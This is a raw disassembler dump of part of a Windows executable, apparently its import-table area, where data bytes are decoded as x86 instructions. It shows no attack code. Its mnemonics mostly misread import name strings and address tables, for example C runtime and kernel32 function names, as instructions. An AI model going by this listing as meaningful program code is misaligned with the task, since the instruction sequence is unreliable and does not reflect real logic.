  41d58b:	add    BYTE PTR [esi-0x26],ch
  41d58e:	add    DWORD PTR [eax],eax
  41d590:	js     0x41d56c
  41d592:	add    DWORD PTR [eax],eax
  41d594:	xchg   dl,bl
  41d596:	add    DWORD PTR [eax],eax
  41d598:	mov    ds,edx
  41d59a:	add    DWORD PTR [eax],eax
  41d59c:	call   0x1da:0xa40001da
  41d5a3:	add    BYTE PTR [esi-0x47fffe26],ch
  41d5a9:	fiadd  DWORD PTR [ecx]
  41d5ab:	add    ah,cl
  41d5ad:	fiadd  DWORD PTR [ecx]
  41d5af:	add    ah,bl
  41d5b1:	fiadd  DWORD PTR [ecx]
  41d5b3:	add    al,ch
  41d5b5:	fiadd  DWORD PTR [ecx]
  41d5b7:	add    dl,dh
  41d5b9:	fiadd  DWORD PTR [ecx]
  41d5bb:	add    ah,bh
  41d5bd:	fiadd  DWORD PTR [ecx]
  41d5bf:	add    BYTE PTR [eax],al
  41d5c1:	add    BYTE PTR [eax],al
  41d5c3:	add    BYTE PTR [edx],dl
  41d5c5:	fild   DWORD PTR [ecx]
  41d5c7:	add    BYTE PTR [eax],dh
  41d5c9:	fild   DWORD PTR [ecx]
  41d5cb:	add    BYTE PTR [eax-0x25],cl
  41d5ce:	add    DWORD PTR [eax],eax
  41d5d0:	push   0x7a0001db
  41d5d5:	fild   DWORD PTR [ecx]
  41d5d7:	add    BYTE PTR [edx-0x57fffe25],cl
  41d5dd:	fild   DWORD PTR [ecx]
  41d5df:	add    dl,al
  41d5e1:	fild   DWORD PTR [ecx]
  41d5e3:	add    dh,dl
  41d5e5:	fild   DWORD PTR [ecx]
  41d5e7:	add    dh,ah
  41d5e9:	fild   DWORD PTR [ecx]
  41d5eb:	add    BYTE PTR [edx],al
  41d5ed:	fadd   QWORD PTR [ecx]
  41d5ef:	add    BYTE PTR [esp+ebx*8],bl
  41d5f2:	add    DWORD PTR [eax],eax
  41d5f4:	sub    al,0xdc
  41d5f6:	add    DWORD PTR [eax],eax
  41d5f8:	cmp    bl,ah
  41d5fa:	add    DWORD PTR [eax],eax
  41d5fc:	dec    esi
  41d5fd:	fadd   QWORD PTR [ecx]
  41d5ff:	add    BYTE PTR [edx-0x24],bl
  41d602:	add    DWORD PTR [eax],eax
  41d604:	data16 fadd QWORD PTR [ecx]
  41d607:	add    BYTE PTR [eax-0x24],bh
  41d60a:	add    DWORD PTR [eax],eax
  41d60c:	mov    bl,ah
  41d60e:	add    DWORD PTR [eax],eax
  41d610:	pushf  
  41d611:	fadd   QWORD PTR [ecx]
  41d613:	add    BYTE PTR [esi-0x3ffffe24],ch
  41d619:	fadd   QWORD PTR [ecx]
  41d61b:	add    ah,cl
  41d61d:	fadd   QWORD PTR [ecx]
  41d61f:	add    al,ah
  41d621:	fadd   QWORD PTR [ecx]
  41d623:	add    ah,dh
  41d625:	fadd   QWORD PTR [ecx]
  41d627:	add    BYTE PTR [esi],al
  41d629:	fld    QWORD PTR [ecx]
  41d62b:	add    BYTE PTR [esi],dl
  41d62d:	fld    QWORD PTR [ecx]
  41d62f:	add    BYTE PTR [ebx*8-0x22c3ffff],ah
  41d636:	add    DWORD PTR [eax],eax
  41d638:	dec    edx
  41d639:	fld    QWORD PTR [ecx]
  41d63b:	add    BYTE PTR [eax-0x23],bl
  41d63e:	add    DWORD PTR [eax],eax
  41d640:	pusha  
  41d641:	fld    QWORD PTR [ecx]
  41d643:	add    BYTE PTR [esi-0x23],ch
  41d646:	add    DWORD PTR [eax],eax
  41d648:	test   ch,bl
  41d64a:	add    DWORD PTR [eax],eax
  41d64c:	mov    ds,ebp
  41d64e:	add    DWORD PTR [eax],eax
  41d650:	sahf   
  41d651:	fld    QWORD PTR [ecx]
  41d653:	add    BYTE PTR [ebp+ebx*8-0x2239ffff],dh
  41d65a:	add    DWORD PTR [eax],eax
  41d65c:	fcmovu st,st(5)
  41d65e:	add    DWORD PTR [eax],eax
  41d660:	out    dx,al
  41d661:	fld    QWORD PTR [ecx]
  41d663:	add    ah,bh
  41d665:	fld    QWORD PTR [ecx]
  41d667:	add    BYTE PTR [eax],cl
  41d669:	fiadd  WORD PTR [ecx]
  41d66b:	add    BYTE PTR [eax],ah
  41d66d:	fiadd  WORD PTR [ecx]
  41d66f:	add    BYTE PTR [edx],dh
  41d671:	fiadd  WORD PTR [ecx]
  41d673:	add    BYTE PTR [edx-0x22],cl
  41d676:	add    DWORD PTR [eax],eax
  41d678:	pop    esp
  41d679:	fiadd  WORD PTR [ecx]
  41d67b:	add    BYTE PTR [esi+ebx*8+0x1],dh
  41d67f:	add    BYTE PTR [edx-0x71fffe22],al
  41d685:	fiadd  WORD PTR [ecx]
  41d687:	add    BYTE PTR [edx+0x1de],ah
  41d68d:	add    BYTE PTR [eax],al
  41d68f:	add    al,al
  41d691:	fiadd  WORD PTR [ecx]
  41d693:	add    dl,cl
  41d695:	fiadd  WORD PTR [ecx]
  41d697:	add    ah,dl
  41d699:	fiadd  WORD PTR [ecx]
  41d69b:	add    al,ah
  41d69d:	fiadd  WORD PTR [ecx]
  41d69f:	add    ah,dh
  41d6a1:	fiadd  WORD PTR [ecx]
  41d6a3:	add    BYTE PTR [eax],al
  41d6a5:	fild   WORD PTR [ecx]
  41d6a7:	add    BYTE PTR [edx],bl
  41d6a9:	fild   WORD PTR [ecx]
  41d6ab:	add    BYTE PTR [edx],ch
  41d6ad:	fild   WORD PTR [ecx]
  41d6af:	add    BYTE PTR [eax],bh
  41d6b1:	fild   WORD PTR [ecx]
  41d6b3:	add    BYTE PTR [eax-0x21],dl
  41d6b6:	add    DWORD PTR [eax],eax
  41d6b8:	fild   WORD PTR fs:[ecx]
  41d6bb:	add    BYTE PTR [esi-0x21],bh
  41d6be:	add    DWORD PTR [eax],eax
  41d6c0:	mov    edi,ds
  41d6c2:	add    DWORD PTR [eax],eax
  41d6c4:	cwde   
  41d6c5:	fild   WORD PTR [ecx]
  41d6c7:	add    BYTE PTR [esi-0x45fffe21],ah
  41d6cd:	fild   WORD PTR [ecx]
  41d6cf:	add    dh,al
  41d6d1:	fild   WORD PTR [ecx]
  41d6d3:	add    dh,dl
  41d6d5:	fild   WORD PTR [ecx]
  41d6d7:	add    dh,ah
  41d6d9:	fild   WORD PTR [ecx]
  41d6db:	add    ah,bh
  41d6dd:	fild   WORD PTR [ecx]
  41d6df:	add    BYTE PTR [eax],cl
  41d6e1:	loopne 0x41d6e4
  41d6e3:	add    BYTE PTR [eax+eiz*8],dl
  41d6e6:	add    DWORD PTR [eax],eax
  41d6e8:	sub    al,ah
  41d6ea:	add    DWORD PTR [eax],eax
  41d6ec:	ds loopne 0x41d6f0
  41d6ef:	add    BYTE PTR [esi-0x20],dl
  41d6f2:	add    DWORD PTR [eax],eax
  41d6f4:	data16 loopne 0x41d6f8
  41d6f7:	add    BYTE PTR [edx-0x20],dh
  41d6fa:	add    DWORD PTR [eax],eax
  41d6fc:	xchg   al,ah
  41d6fe:	add    DWORD PTR [eax],eax
  41d700:	xchg   esp,eax
  41d701:	loopne 0x41d704
  41d703:	add    BYTE PTR [esi-0x47fffe20],ch
  41d709:	loopne 0x41d70c
  41d70b:	add    dl,cl
  41d70d:	loopne 0x41d710
  41d70f:	add    ah,bl
  41d711:	loopne 0x41d714
  41d713:	add    dh,ch
  41d715:	loopne 0x41d718
  41d717:	add    dh,bh
  41d719:	loopne 0x41d71c
  41d71b:	add    BYTE PTR [eax],cl
  41d71d:	loope  0x41d720
  41d71f:	add    BYTE PTR [esi],bl
  41d721:	loope  0x41d724
  41d723:	add    BYTE PTR [edx],dh
  41d725:	loope  0x41d728
  41d727:	add    BYTE PTR [esi-0x1f],al
  41d72a:	add    DWORD PTR [eax],eax
  41d72c:	push   esi
  41d72d:	loope  0x41d730
  41d72f:	add    BYTE PTR [esi-0x1f],ah
  41d732:	add    DWORD PTR [eax],eax
  41d734:	jb     0x41d717
  41d736:	add    DWORD PTR [eax],eax
  41d738:	test   cl,ah
  41d73a:	add    DWORD PTR [eax],eax
  41d73c:	mov    al,ds:0xb60001e1
  41d741:	loope  0x41d744
  41d743:	add    dl,al
  41d745:	loope  0x41d748
  41d747:	add    dh,dl
  41d749:	loope  0x41d74c
  41d74b:	add    BYTE PTR [eax],al
  41d74d:	add    BYTE PTR [eax],al
  41d74f:	add    ah,dh
  41d751:	loope  0x41d754
  41d753:	add    BYTE PTR [edx+eiz*8],al
  41d756:	add    DWORD PTR [eax],eax
  41d758:	adc    al,0xe2
  41d75a:	add    DWORD PTR [eax],eax
  41d75c:	and    ah,dl
  41d75e:	add    DWORD PTR [eax],eax
  41d760:	xor    dl,ah
  41d762:	add    DWORD PTR [eax],eax
  41d764:	ds loop 0x41d768
  41d767:	add    BYTE PTR [edx-0x1e],dl
  41d76a:	add    DWORD PTR [eax],eax
  41d76c:	pusha  
  41d76d:	loop   0x41d770
  41d76f:	add    BYTE PTR [edx-0x1e],bh
  41d772:	add    DWORD PTR [eax],eax
  41d774:	xchg   dl,ah
  41d776:	add    DWORD PTR [eax],eax
  41d778:	cwde   
  41d779:	loop   0x41d77c
  41d77b:	add    BYTE PTR [edx+eiz*8-0x1d47ffff],ah
  41d782:	add    DWORD PTR [eax],eax
  41d784:	int3   
  41d785:	loop   0x41d788
  41d787:	add    dh,dl
  41d789:	loop   0x41d78c
  41d78b:	add    al,ah
  41d78d:	loop   0x41d790
  41d78f:	add    dl,bh
  41d791:	loop   0x41d794
  41d793:	add    BYTE PTR [edx],cl
  41d795:	jecxz  0x41d798
  41d797:	add    BYTE PTR [edx],bl
  41d799:	jecxz  0x41d79c
  41d79b:	add    BYTE PTR [ebx+eiz*8],ah
  41d79e:	add    DWORD PTR [eax],eax
  41d7a0:	xor    al,0xe3
  41d7a2:	add    DWORD PTR [eax],eax
  41d7a4:	inc    eax
  41d7a5:	jecxz  0x41d7a8
  41d7a7:	add    BYTE PTR [esi-0x1d],cl
  41d7aa:	add    DWORD PTR [eax],eax
  41d7ac:	fs jecxz 0x41d7b0
  41d7af:	add    BYTE PTR [esi-0x1d],dh
  41d7b2:	add    DWORD PTR [eax],eax
  41d7b4:	mov    fs,ebx
  41d7b6:	add    DWORD PTR [eax],eax
  41d7b8:	mov    ds:0xb00001e3,al
  41d7bd:	jecxz  0x41d7c0
  41d7bf:	add    dl,al
  41d7c1:	jecxz  0x41d7c4
  41d7c3:	add    dh,cl
  41d7c5:	jecxz  0x41d7c8
  41d7c7:	add    dh,bl
  41d7c9:	jecxz  0x41d7cc
  41d7cb:	add    ah,ch
  41d7cd:	jecxz  0x41d7d0
  41d7cf:	add    BYTE PTR [eax],al
  41d7d1:	in     al,0x1
  41d7d3:	add    BYTE PTR [esi],cl
  41d7d5:	in     al,0x1
  41d7d7:	add    BYTE PTR [edx],ch
  41d7d9:	in     al,0x1
  41d7db:	add    BYTE PTR [esp+eiz*8],bh
  41d7de:	add    DWORD PTR [eax],eax
  41d7e0:	dec    esp
  41d7e1:	in     al,0x1
  41d7e3:	add    BYTE PTR [esi-0x1c],bl
  41d7e6:	add    DWORD PTR [eax],eax
  41d7e8:	push   0xffffffe4
  41d7ea:	add    DWORD PTR [eax],eax
  41d7ec:	jl     0x41d7d2
  41d7ee:	add    DWORD PTR [eax],eax
  41d7f0:	mov    ah,ah
  41d7f2:	add    DWORD PTR [eax],eax
  41d7f4:	cwde   
  41d7f5:	in     al,0x1
  41d7f7:	add    BYTE PTR [esi-0x3ffffe1c],ch
  41d7fd:	in     al,0x1
  41d7ff:	add    al,dl
  41d801:	in     al,0x1
  41d803:	add    dl,ah
  41d805:	in     al,0x1
  41d807:	add    al,dh
  41d809:	in     al,0x1
  41d80b:	add    BYTE PTR [eax],cl
  41d80d:	in     eax,0x1
  41d80f:	add    BYTE PTR [eiz*8-0x1ad5ffff],bl
  41d816:	add    DWORD PTR [eax],eax
  41d818:	ds in  eax,0x1
  41d81b:	add    BYTE PTR [edx-0x1b],cl
  41d81e:	add    DWORD PTR [eax],eax
  41d820:	pop    edx
  41d821:	in     eax,0x1
  41d823:	add    BYTE PTR [esi-0x1b],ch
  41d826:	add    DWORD PTR [eax],eax
  41d828:	jle    0x41d80f
  41d82a:	add    DWORD PTR [eax],eax
  41d82c:	nop
  41d82d:	in     eax,0x1
  41d82f:	add    BYTE PTR [ebp+eiz*8-0x1a55ffff],bl
  41d836:	add    DWORD PTR [eax],eax
  41d838:	mov    eax,0xca0001e5
  41d83d:	in     eax,0x1
  41d83f:	add    dl,bl
  41d841:	in     eax,0x1
  41d843:	add    dh,ah
  41d845:	in     eax,0x1
  41d847:	add    ah,bh
  41d849:	in     eax,0x1
  41d84b:	add    BYTE PTR [esi],cl
  41d84d:	out    0x1,al
  41d84f:	add    BYTE PTR [eax],ch
  41d851:	out    0x1,al
  41d853:	add    BYTE PTR [edx],bh
  41d855:	out    0x1,al
  41d857:	add    BYTE PTR [esi+eiz*8+0x1],cl
  41d85b:	add    BYTE PTR [eax-0x1a],bl
  41d85e:	add    DWORD PTR [eax],eax
  41d860:	push   0x7a0001e6
  41d865:	out    0x1,al
  41d867:	add    BYTE PTR [esi-0x67fffe1a],al
  41d86d:	out    0x1,al
  41d86f:	add    BYTE PTR [edx-0x35fffe1a],dh
  41d875:	out    0x1,al
  41d877:	add    ah,bl
  41d879:	out    0x1,al
  41d87b:	add    dl,ch
  41d87d:	out    0x1,al
  41d87f:	add    al,bh
  41d881:	out    0x1,al
  41d883:	add    BYTE PTR [esi],cl
  41d885:	out    0x1,eax
  41d887:	add    BYTE PTR [esi],bl
  41d889:	out    0x1,eax
  41d88b:	add    BYTE PTR [edx],ch
  41d88d:	out    0x1,eax
  41d88f:	add    BYTE PTR [edx],bh
  41d891:	out    0x1,eax
  41d893:	add    BYTE PTR [edx-0x19],cl
  41d896:	add    DWORD PTR [eax],eax
  41d898:	pop    esp
  41d899:	out    0x1,eax
  41d89b:	add    BYTE PTR [eax-0x19],ch
  41d89e:	add    DWORD PTR [eax],eax
  41d8a0:	jbe    0x41d889
  41d8a2:	add    DWORD PTR [eax],eax
  41d8a4:	xchg   bh,ah
  41d8a6:	add    DWORD PTR [eax],eax
  41d8a8:	cwde   
  41d8a9:	out    0x1,eax
  41d8ab:	add    BYTE PTR [eax-0x45fffe19],ch
  41d8b1:	out    0x1,eax
  41d8b3:	add    al,dl
  41d8b5:	out    0x1,eax
  41d8b7:	add    dh,ah
  41d8b9:	out    0x1,eax
  41d8bb:	add    dh,dh
  41d8bd:	out    0x1,eax
  41d8bf:	add    BYTE PTR [edx],al
  41d8c1:	call   0xe859d8c7
  41d8c6:	add    DWORD PTR [eax],eax
  41d8c8:	and    al,0xe8
  41d8ca:	add    DWORD PTR [eax],eax
  41d8cc:	xor    al,0xe8
  41d8ce:	add    DWORD PTR [eax],eax
  41d8d0:	dec    eax
  41d8d1:	call   0xe897d8d7
  41d8d6:	add    DWORD PTR [eax],eax
  41d8d8:	callw  0xd8dd
  41d8dc:	jp     0x41d8c6
  41d8de:	add    DWORD PTR [eax],eax
  41d8e0:	xchg   al,ch
  41d8e2:	add    DWORD PTR [eax],eax
  41d8e4:	xchg   esi,eax
  41d8e5:	call   0xe8e3d8eb
  41d8ea:	add    DWORD PTR [eax],eax
  41d8ec:	mov    dl,0xe8
  41d8ee:	add    DWORD PTR [eax],eax
  41d8f0:	(bad)  
  41d8f1:	call   0xe913d8f7
  41d8f6:	add    DWORD PTR [eax],eax
  41d8f8:	in     al,0xe8
  41d8fa:	add    DWORD PTR [eax],eax
  41d8fc:	lock call 0xe93fd903
  41d902:	add    DWORD PTR [eax],eax
  41d904:	or     al,0xe9
  41d906:	add    DWORD PTR [eax],eax
  41d908:	sbb    ch,cl
  41d90a:	add    DWORD PTR [eax],eax
  41d90c:	add    BYTE PTR [eax],al
  41d90e:	add    BYTE PTR [eax],al
  41d910:	or     al,0x2
  41d912:	add    BYTE PTR [eax+0x0],al
  41d918:	cmc    
  41d919:	add    BYTE PTR [edi+0x63],bl
  41d91c:	outs   dx,DWORD PTR ds:[esi]
  41d91d:	outs   dx,BYTE PTR ds:[esi]
  41d91e:	je     0x41d992
  41d920:	outs   dx,DWORD PTR ds:[esi]
  41d921:	ins    BYTE PTR es:[edi],dx
  41d922:	data16 jo 0x41d925
  41d925:	add    BYTE PTR [ebx],al
  41d927:	add    al,0x73
  41d929:	jns    0x41d99e
  41d92b:	je     0x41d992
  41d92d:	ins    DWORD PTR es:[edi],dx
  41d92e:	add    BYTE PTR [eax],al
  41d930:	fwait
  41d931:	add    ebp,DWORD PTR [ecx+0x73]
  41d934:	jo     0x41d9a8
  41d936:	imul   ebp,DWORD PTR [esi+0x74],0x61035a00
  41d93d:	je     0x41d9ae
  41d93f:	ins    BYTE PTR es:[edi],dx
  41d940:	add    BYTE PTR [eax],al
  41d942:	jmp    0x7363:0x72747303
  41d949:	jo     0x41d9b9
  41d94b:	add    BYTE PTR [edi+0x73626d03],dh
  41d951:	je     0x41d9c2
  41d953:	ja     0x41d9b8
  41d955:	jae    0x41d957
  41d957:	add    bh,ah
  41d959:	add    esi,DWORD PTR [ebx+0x74]
  41d95c:	jb     0x41d9c1
  41d95e:	outs   dx,DWORD PTR ds:[esi]
  41d95f:	ins    BYTE PTR es:[edi],dx
  41d960:	ins    BYTE PTR es:[edi],dx
  41d961:	add    ch,al
  41d963:	add    esi,DWORD PTR [eax+0x72]
  41d966:	imul   ebp,DWORD PTR [esi+0x74],0xb000066
  41d96d:	add    al,0x74
  41d96f:	outs   dx,DWORD PTR ds:[esi]
  41d970:	ja     0x41d9de
  41d972:	outs   dx,DWORD PTR ds:[esi]
  41d973:	ja     0x41d9da
  41d975:	jb     0x41d977
  41d977:	add    BYTE PTR [esi],al
  41d979:	add    al,0x74
  41d97b:	imul   ebp,DWORD PTR [ebp+0x65],0x36d0000
  41d982:	data16 addr16 gs je 0x41d9ea
  41d987:	add    BYTE PTR [ebx+0x735f5f00],dh
  41d98d:	gs je  0x41d9ef
  41d990:	popa   
  41d991:	jo     0x41da03
  41d993:	pop    edi
  41d994:	je     0x41da0f
  41d996:	jo     0x41d9fd
  41d998:	add    BYTE PTR [eax],al
  41d99a:	mov    al,ds:0x705f5f00
  41d99f:	pop    edi
  41d9a0:	pop    edi
  41d9a1:	ins    WORD PTR es:[edi],dx
  41d9a3:	outs   dx,DWORD PTR ds:[esi]
  41d9a4:	fs add BYTE PTR gs:[eax],al
  41d9a8:	xchg   esp,eax
  41d9a9:	add    ebp,DWORD PTR [ecx+0x73]
  41d9ac:	popa   
  41d9ad:	ins    BYTE PTR es:[edi],dx
  41d9ae:	outs   dx,BYTE PTR ds:[esi]
  41d9af:	jne    0x41da1e
  41d9b1:	add    dl,bh
  41d9b3:	add    esi,DWORD PTR [ebx+0x74]
  41d9b6:	jb     0x41da2c
  41d9b8:	outs   dx,DWORD PTR ds:[esi]
  41d9b9:	imul   eax,DWORD PTR [eax],0x0
  41d9bc:	sbb    al,0x4
  41d9be:	ja     0x41da23
  41d9c0:	jae    0x41da25
  41d9c2:	popa   
  41d9c3:	je     0x41d9c5
  41d9c5:	add    BYTE PTR [ecx+0x74626d03],bh
  41d9cb:	outs   dx,DWORD PTR ds:[esi]
  41d9cc:	ja     0x41da31
  41d9ce:	add    BYTE PTR [eax],al
  41d9d0:	fwait
  41d9d1:	add    BYTE PTR [edi+0x5f],bl
  41d9d4:	jo     0x41da35
  41d9d6:	pop    edi
  41d9d7:	arpl   WORD PTR [edi+0x6d],bp
  41d9da:	ins    DWORD PTR es:[edi],dx
  41d9db:	outs   dx,DWORD PTR ds:[esi]
  41d9dc:	fs add BYTE PTR gs:[eax],al
  41d9e0:	loope  0x41d9e5
  41d9e2:	jae    0x41da57
  41d9e4:	arpl   WORD PTR [ecx+0x6e],sp
  41d9e7:	data16 add BYTE PTR [eax],al
  41d9ea:	fild   DWORD PTR [eax]
  41d9ec:	pop    edi
  41d9ed:	popa   
  41d9ee:	ins    DWORD PTR es:[edi],dx
  41d9ef:	jae    0x41da58
  41d9f1:	pop    edi
  41d9f2:	gs js  0x41da5e
  41d9f5:	je     0x41d9f7
  41d9f7:	add    BYTE PTR [esi+0x6e695f01],al
  41d9fd:	imul   esi,DWORD PTR [esp+esi*2+0x65],0xc8006d72
  41da05:	add    esi,DWORD PTR [eax+0x75]
  41da08:	je     0x41da6d
  41da0a:	push   0xb1007261
  41da0f:	add    ebp,DWORD PTR [edi+ebp*2+0x63]
  41da13:	popa   
  41da14:	ins    BYTE PTR es:[edi],dx
  41da15:	je     0x41da80
  41da17:	ins    DWORD PTR es:[edi],dx
  41da18:	add    BYTE PTR gs:[ecx+0x3],ch
  41da1c:	data16 arpl WORD PTR [edi+ebp*2+0x73],bp
  41da21:	add    BYTE PTR gs:[eax],al
  41da24:	or     eax,0x676e7504
  41da29:	gs je  0x41da8f
  41da2c:	add    BYTE PTR [eax],al
  41da2e:	sub    DWORD PTR [edi+esi*2],eax
  41da31:	arpl   WORD PTR [ebx+0x6e],si
  41da34:	arpl   WORD PTR [eax+0x79],si
  41da37:	add    bh,cl
  41da39:	add    esi,DWORD PTR [edx+0x61]
  41da3c:	outs   dx,BYTE PTR ds:[esi]
  41da3d:	add    BYTE PTR fs:[eax],al
  41da40:	sahf   
  41da41:	add    DWORD PTR [edi+0x69],ebx
  41da44:	jae    0x41dab3
  41da46:	bound  esp,QWORD PTR [edx+0x6c]
  41da49:	gs popa 
  41da4b:	add    BYTE PTR fs:[eax],al
  41da4e:	add    DWORD PTR [ebx+esi*2],eax
  41da51:	ja     0x41dac6
  41da53:	arpl   WORD PTR [ecx+0x6e],sp
  41da56:	data16 add BYTE PTR [ebx+0x77736903],ch
  41da5d:	js     0x41dac3
  41da5f:	imul   esp,DWORD PTR [edi+0x69],0x4280074
  41da66:	ja     0x41dacb
  41da68:	jae    0x41dad8
  41da6a:	arpl   WORD PTR [ebp+0x70],bp
  41da6d:	add    BYTE PTR [esi+0x75736903],bl
  41da73:	jo     0x41dae5
  41da75:	gs jb  0x41da78
  41da78:	push   edx
  41da79:	add    BYTE PTR [edi+0x58],bl
  41da7c:	arpl   WORD PTR [eax+0x74],si
  41da7f:	inc    esi
  41da80:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x1230072
  41da88:	pop    edi
  41da89:	gs js  0x41daf5
  41da8c:	je     0x41da8e
  41da8e:	sbb    BYTE PTR [esi+esi*2],al
  41da91:	jae    0x41db0a
  41da93:	jo     0x41db07
  41da95:	imul   ebp,DWORD PTR [esi+0x74],0xe80066
  41da9c:	pop    edi
  41da9d:	arpl   WORD PTR [ebp+0x78],sp
  41daa0:	imul   esi,DWORD PTR [eax+eax*1+0x0],0x7362035b
  41daa8:	gs popa 
  41daaa:	jb     0x41db0f
  41daac:	push   0x7303e800
  41dab1:	je     0x41db25
  41dab3:	arpl   WORD PTR [eax+0x79],si
  41dab6:	add    BYTE PTR [eax],al
  41dab8:	mov    ch,0x0
  41daba:	pop    edi
  41dabb:	pop    edi
  41dabc:	jae    0x41db23
  41dabe:	je     0x41db35
  41dac0:	jae    0x41db27
  41dac2:	jb     0x41db31
  41dac4:	popa   
  41dac5:	je     0x41db2f
  41dac7:	gs jb  0x41db3c
  41daca:	add    BYTE PTR [eax],al
  41dacc:	jb     0x41dace
  41dace:	pop    edi
  41dacf:	pop    edi
  41dad0:	addr16 gs je 0x41db41
  41dad4:	popa   
  41dad5:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  41dadc:	pop    edi
  41dadd:	add    esp,DWORD PTR [ebx+0x6c]
  41dae0:	gs popa 
  41dae2:	jb     0x41db49
  41dae4:	jb     0x41db58
  41dae6:	add    BYTE PTR [eax],al
  41dae8:	and    DWORD PTR [edi+esi*2],eax
  41daeb:	arpl   WORD PTR [ebx+0x63],si
  41daee:	jo     0x41db69
  41daf0:	add    BYTE PTR [eax],al
  41daf2:	std    
  41daf3:	add    esi,DWORD PTR [ebx+0x74]
  41daf6:	jb     0x41db6c
  41daf8:	outs   dx,DWORD PTR ds:[esi]
  41daf9:	jne    0x41db67
  41dafb:	add    bl,al
  41dafd:	add    esi,DWORD PTR [eax+0x65]
  41db00:	jb     0x41db74
  41db02:	outs   dx,DWORD PTR ds:[esi]
  41db03:	jb     0x41db05
  41db05:	add    BYTE PTR [ebp+0x53],cl
  41db08:	push   esi
  41db09:	inc    ebx
  41db0a:	push   edx
  41db0b:	push   esp
  41db0c:	cs fs ins BYTE PTR es:[edi],dx
  41db0f:	ins    BYTE PTR es:[edi],dx
  41db10:	add    BYTE PTR [eax],al
  41db12:	inc    ecx
  41db13:	add    al,0x53
  41db15:	gs je  0x41db6d
  41db18:	outs   dx,BYTE PTR ds:[esi]
  41db19:	push   0x6c646e61
  41db1e:	gs fs inc ebp
  41db21:	js     0x41db86
  41db23:	gs jo  0x41db9a
  41db26:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  41db2d:	gs jb  0x41db30
  41db30:	jmp    0x6946:0x74654701
  41db37:	ins    BYTE PTR es:[edi],dx
  41db38:	gs inc ecx
  41db3a:	je     0x41dbb0
  41db3c:	jb     0x41dba7
  41db3e:	bound  esi,QWORD PTR [ebp+0x74]
  41db41:	gs jae 0x41db89
  41db44:	js     0x41db87
  41db46:	add    BYTE PTR [eax],al
  41db48:	pop    esp
  41db49:	add    DWORD PTR [esi+0x69],eax
  41db4c:	outs   dx,BYTE PTR ds:[esi]
  41db4d:	fs inc esi
  41db4f:	imul   esi,DWORD PTR [edx+0x73],0x61684374
  41db56:	outs   dx,BYTE PTR ds:[esi]
  41db57:	addr16 gs dec esi
  41db5a:	outs   dx,DWORD PTR ds:[esi]
  41db5b:	je     0x41dbc6
  41db5d:	imul   sp,WORD PTR [ebx+0x61],0x6974
  41db63:	outs   dx,DWORD PTR ds:[esi]
  41db64:	outs   dx,BYTE PTR ds:[esi]
  41db65:	push   edi
  41db66:	add    BYTE PTR [eax],al
  41db68:	mov    ds:0x6c614300,al
  41db6d:	ins    BYTE PTR es:[edi],dx
  41db6e:	dec    esi
  41db6f:	popa   
  41db70:	ins    DWORD PTR es:[edi],dx
  41db71:	gs fs push eax
  41db74:	imul   esi,DWORD PTR [eax+0x65],0xdb000057
  41db7b:	add    cl,BYTE PTR [ecx+0x73]
  41db7e:	push   esi
  41db7f:	popa   
  41db80:	ins    BYTE PTR es:[edi],dx
  41db81:	imul   esp,DWORD PTR [esp+ecx*2+0x6f],0x656c6163
  41db89:	add    BYTE PTR [ebp+0x1],ah
  41db8c:	inc    esi
  41db8d:	imul   ebp,DWORD PTR [esi+0x64],0x7478654e
  41db94:	inc    ebx
  41db95:	push   0x65676e61
  41db9a:	dec    esi
  41db9b:	outs   dx,DWORD PTR ds:[esi]
  41db9c:	je     0x41dc07
  41db9e:	imul   sp,WORD PTR [ebx+0x61],0x6974
  41dba4:	outs   dx,DWORD PTR ds:[esi]
  41dba5:	outs   dx,BYTE PTR ds:[esi]
  41dba6:	add    BYTE PTR [eax],al
  41dba8:	cmp    BYTE PTR [ebx+edx*2],al
  41dbab:	gs je  0x41dc02
  41dbae:	push   0x64616572
  41dbb3:	inc    ebp
  41dbb4:	js     0x41dc1b
  41dbb6:	arpl   WORD PTR [ebp+0x74],si
  41dbb9:	imul   ebp,DWORD PTR [edi+0x6e],0x74617453
  41dbc0:	add    BYTE PTR gs:[esi],bl
  41dbc3:	add    al,BYTE PTR [edi+0x65]
  41dbc6:	je     0x41dc18
  41dbc8:	jb     0x41dc33
  41dbca:	outs   dx,DWORD PTR ds:[esi]
  41dbcb:	jb     0x41dc36
  41dbcd:	je     0x41dc48
  41dbcf:	inc    ebx
  41dbd0:	ins    BYTE PTR es:[edi],dx
  41dbd1:	popa   
  41dbd2:	jae    0x41dc47
  41dbd4:	add    BYTE PTR [eax],al
  41dbd6:	add    DWORD PTR [bp+0x69],eax
  41dbda:	outs   dx,BYTE PTR ds:[esi]
  41dbdb:	fs dec esi
  41dbdd:	gs js  0x41dc54
  41dbe0:	inc    esi
  41dbe1:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x57048d00
  41dbe9:	popa   
  41dbea:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x6c754d72
  41dbf2:	je     0x41dc5d
  41dbf4:	jo     0x41dc62
  41dbf6:	gs dec edi
  41dbf8:	bound  ebp,QWORD PTR [edx+0x65]
  41dbfb:	arpl   WORD PTR [ebx+esi*2+0x45],si
  41dbff:	js     0x41dc01
  41dc01:	add    BYTE PTR [edi],ah
  41dc03:	add    al,0x53
  41dc05:	gs je  0x41dc56
  41dc08:	popa   
  41dc09:	ins    DWORD PTR es:[edi],dx
  41dc0a:	gs fs push eax
  41dc0d:	imul   esi,DWORD PTR [eax+0x65],0x646e6148
  41dc14:	ins    BYTE PTR es:[edi],dx
  41dc15:	gs push ebx
  41dc17:	je     0x41dc7a
  41dc19:	je     0x41dc80
  41dc1b:	add    bl,bh
  41dc1d:	add    DWORD PTR [edi+0x65],eax
  41dc20:	je     0x41dc6e
  41dc22:	popa   
  41dc23:	jae    0x41dc99
  41dc25:	inc    ebp
  41dc26:	jb     0x41dc9a
  41dc28:	outs   dx,DWORD PTR ds:[esi]
  41dc29:	jb     0x41dc2b
  41dc2b:	add    BYTE PTR [eax+0x6f6c4702],dl
  41dc31:	bound  esp,QWORD PTR [ecx+0x6c]
  41dc34:	inc    esi
  41dc35:	jb     0x41dc9c
  41dc37:	add    BYTE PTR gs:[eax],al
  41dc3a:	or     al,BYTE PTR [edx]
  41dc3c:	inc    edi
  41dc3d:	gs je  0x41dc8d
  41dc40:	outs   dx,DWORD PTR ds:[esi]
  41dc41:	fs jne 0x41dcb0
  41dc44:	gs dec eax
  41dc46:	popa   
  41dc47:	outs   dx,BYTE PTR ds:[esi]
